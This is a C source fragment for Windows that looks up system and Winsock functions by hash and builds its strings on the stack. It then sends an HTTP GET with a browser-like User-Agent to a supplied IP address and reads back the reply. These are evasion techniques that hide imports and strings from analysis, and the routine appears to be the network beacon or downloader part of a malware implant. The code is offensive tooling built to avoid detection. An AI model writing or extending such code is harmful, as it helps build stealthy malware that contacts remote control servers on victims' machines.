typedef int (WINAPI *P_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *P_socket)(int, int, int);
typedef int (WINAPI *P_connect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *P_send)(SOCKET, const char*, int, int);
typedef int (WINAPI *P_recv)(SOCKET, char*, int, int);
typedef int (WINAPI *P_closesocket)(SOCKET);
typedef struct hostent* (WINAPI *P_gethostbyname)(const char*);
typedef VOID (WINAPI *P_Sleep)(DWORD);
typedef unsigned long (WINAPI *P_inet_addr)(const char*);

int HTTP_GET(const char* ip, int port, char* buffer, int max_len) {
    HMODULE hKernel32 = get_module_by_hash(H_KERNEL32);
    P_LoadLibraryA pLoadLibraryA = (P_LoadLibraryA)get_func_by_hash(hKernel32, H_LoadLibraryA);
    char s_ws2[] = {'w','s','2','_','3','2','.','d','l','l', 0};
    HMODULE hWs2_32 = pLoadLibraryA(s_ws2);
    
    if (!hWs2_32) return 0;
    
    P_WSAStartup pWSAStartup = (P_WSAStartup)get_func_by_hash(hWs2_32, H_WSAStartup);
    P_socket pSocket = (P_socket)get_func_by_hash(hWs2_32, H_socket);
    P_connect pConnect = (P_connect)get_func_by_hash(hWs2_32, H_connect);
    P_send pSend = (P_send)get_func_by_hash(hWs2_32, H_send);
    P_recv pRecv = (P_recv)get_func_by_hash(hWs2_32, H_recv);
    P_closesocket pClosesocket = (P_closesocket)get_func_by_hash(hWs2_32, H_closesocket);
    P_inet_addr pInet_addr = (P_inet_addr)get_func_by_hash(hWs2_32, H_inet_addr);
    
    WSADATA wsa;
    if (pWSAStartup(0x0202, &wsa) != 0) return 0;
    
    SOCKET s = pSocket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = pInet_addr(ip);
    
    if (pConnect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        pClosesocket(s);
        return 0;
    }
    
    // Construct Request
    char req[512];
    memset(req, 0, 512);
    
    // Stack strings
    char s_get[] = "GET / HTTP/1.1\r\n";
    char s_host[] = "Host: ";
    char s_ua[] = "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n";
    
    strcat(req, s_get);
    strcat(req, s_host);
    strcat(req, ip);
    strcat(req, s_ua);
    
    pSend(s, req, strlen(req), 0);
    
    int total = 0;
    int received = 0;
    received = pRecv(s, buffer, max_len - 1, 0);
    if (received > 0) {
        buffer[received] = 0;
        total = received;
    }
    
    pClosesocket(s);
    return total;
}

